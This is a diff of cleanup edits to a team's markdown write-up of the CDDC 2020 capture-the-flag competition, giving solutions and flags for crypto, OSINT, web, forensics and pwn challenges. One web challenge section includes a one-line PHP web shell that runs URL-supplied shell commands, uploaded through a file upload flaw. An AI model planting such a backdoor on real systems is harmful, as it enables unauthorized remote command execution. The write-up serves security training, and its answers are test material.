@@ -16,15 +16,15 @@ We were given a website that has a countdown, viewing the page source and the fl
 
 ### [Crypto-1] My Best Friend, Julius!
 
-JHLZHY_ZLSSZ_ZLHZOLSSZ_IF_AOL_ZLHZOVYL
+JHLZHY\_ZLSSZ\_ZLHZOLSSZ\_IF\_AOL_ZLHZOVYL
 
-Flag: CAESAR_SELLS_SEASHELLS_BY_THE_SEASHORE
+Flag: `CAESAR_SELLS_SEASHELLS_BY_THE_SEASHORE`
 
 Gaius **Julius** Caesar. Probably a caesar shift cipher, use [cryptii caesar](https://cryptii.com/pipes/caesar-cipher) to decrypt it.
 
 ### [OSINT-1] Better Alternative Than TV
 
-Google "UnduplicitousCorp" result in a Youtube Channel. Flag was found at about channel page.
+Google "UnduplicitousCorp" result in a YouTube Channel. Flag was found at about channel page.
 
 ### [Web-2] VulnLogin
 
@@ -56,19 +56,19 @@ Flag can be found in the comment metadata of the image. Can be view by right cli
 
 Flag: `CDDC20{pho70gr4phy_i5_aw3sOmE}`
 
-
 ### [Pwn (Linux)-1] nc
 
 ```bash
 nc nc.chall.cddc2020.nshc.sg 10000
 ```
+
 netcat to given domain and port
 
 ### [Crypto-2] Cryptic Message
 
 hq hm kbq jipoox yhnnhatoq qb abkmqjtaq p mijhim bn hknijikaim, ipaS yidikyikq tdbk hqm djIyiaimmbJ pky ipas mhcdoi hk hqmion. hn, pnqij ybhkg mb, bkI mhcdox rkbarm btq poo qsi aikQjpo hknijikaim pky djimikqm bki'm ptyhikai vhqs qsi mqpjqhkg-dbhkq pky qsi abkaoTmhbk, bki cpx dJbytai p mqpjqohKg, qsbtgs dbmmhlox p cijiqjhahbtM, inniaq.
 
-My teammate Ethan found out that the ciphertext was encrypted with a substitution  cipher. Use [Automated substitution cipher solver](https://quipqiup.com/) and group all capitalized letters to obtain flag.
+My teammate Ethan found out that the ciphertext was encrypted with a substitution cipher. Use [Automated substitution cipher solver](https://quipqiup.com/) and group all capitalized letters to obtain flag.
 
 ### [Network-1] Baby Shark
 
@@ -92,7 +92,7 @@ Download the virtual machine and run the machine. The flag can be found in the .
 nc zer0.chall.cddc2020.nshc.sg 20002
 ```
 
-My teammate Ethan mutiple 2^31-1 by 2 and able to get the program to print out 0 which results in the flag. 
+My teammate Ethan multiple 2^31-1 by 2 and able to get the program to print out 0 which results in the flag. However, the answer is simple, 2^32-1.
 
 ### [Misc-2] ARGH
 
@@ -124,7 +124,7 @@ Use tools such as [unpy2exe](https://github.com/matiasb/unpy2exe). Couldn't get 
 
 ### [Forensics-3] Top Secret
 
-TopSecret is a .ad1 file, can be view in FTK Imager software and flag is hidden in a text file with lorem texts. 
+TopSecret is a .ad1 file, can be view in FTK Imager software and flag is hidden in a text file with lorem texts.
 
 ### [Pwn (Linux)-3] Find Singapore Bug
 
@@ -171,10 +171,10 @@ The website has File Upload Vulnerability, you are able to upload a simple backd
 ```bash
 <?php echo "</pre>"; system($_GET['cmd']); ?>
 ```
+
 After uploading the backdoor, we can execute our commands in the url.
 
 ![Ma GIF Backdoor](./Ma_GIF_3.png)
-
 
 ### ilovedes
 
@@ -199,7 +199,7 @@ undefined4 main(void)
   int local_18;
   int local_14;
   undefined *local_10;
-  
+
   local_10 = &stack0x00000004;
   local_14 = *(int *)(in_GS_OFFSET + 0x14);
   local_18 = 0;
@@ -240,7 +240,7 @@ undefined4 main(void)
 {
   undefined local_10c [256];
   int local_c;
-  
+
   FUN_00011090(stdin,0);
   FUN_00011090(stdout,0);
   FUN_00011090(stderr,0);
@@ -257,7 +257,7 @@ void FUN_000110a0(void)
 
 {
   int unaff_EBX;
-  
+
                     /* WARNING: Could not recover jumptable at 0x000110a4. Too many branches */
                     /* WARNING: Treating indirect jump as call */
   (**(code **)(unaff_EBX + 0x10))();
@@ -269,8 +269,8 @@ void FUN_000110a0(void)
 
 ### WYSIWYG (Unsolved)
 
-## Addtional resources
+## Additional resources
 
 https://blog.justins.in/cddc20/
 
-Note: *The website above solves some challenges that my team did not, you may want to read it.*
+Note: _The website above solves some challenges that my team did not, you may want to read it._
